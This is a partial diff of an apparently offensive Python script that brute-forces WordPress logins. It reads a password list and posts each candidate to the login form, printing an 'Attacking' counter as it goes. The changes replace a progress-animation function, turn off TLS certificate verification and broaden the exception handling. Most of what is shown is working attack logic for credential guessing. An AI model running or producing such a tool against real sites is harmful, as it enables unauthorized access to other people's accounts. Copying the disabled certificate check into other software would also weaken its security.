@@ -1,11 +1,5 @@
-import os , random , requests , time ,argparse , sys  
-
-def loader (count) :  
-
-    a = "-" * (count % 2 == 0 ) + "+" * ( count % 2 != 0 ) 
-    sys.stdout.write("\r[{0}] Attacking [{1}] >".format(a,a ))
-    sys.stdout.flush() 
-
+import os , random , requests , time ,argparse , sys   
+ 
 def attempt_login( username , password , url)  :   
 
     try : 
@@ -21,11 +15,11 @@ def attempt_login( username , password , url)  :
                 'wp-submit':'Log In',  
                 }  
 
-        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False)    
+        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False , verify = False )  
     
-    except Exception as e : 
+    except :    
         print("\n*** Connection Error has occured *** "  )  
-        exit()
+        exit() 
 
     return resp.status_code 
  
@@ -35,7 +29,8 @@ def execute  () :
     FOUND = False       
 
     #load the files 
-    File = args.passlist 
+    File = args.passlist  
+
     if File  :        
 
         try :   
@@ -51,14 +46,13 @@ def execute  () :
 
     with open(File , 'r' ) as passwords:
         for password in passwords:     
-            count+=1 
-            
-            #loading  effects
-            loader(count) 
+            count+=1    
 
-            password = password.rstrip("\n" )  
+            #loading 
+            sys.stdout.write("\r[+] Attacking [+] ==> tries : {0} >".format(count)) 
+            sys.stdout.flush()  
 
-            url = args.url   
+            password = password.rstrip("\n" )   
 
             #attempt login   
             status  = attempt_login(args.username , password  , args.url )     
@@ -108,4 +102,4 @@ def main () :
 
 
 if __name__ == "__main__":
-    main()  
+    main() 
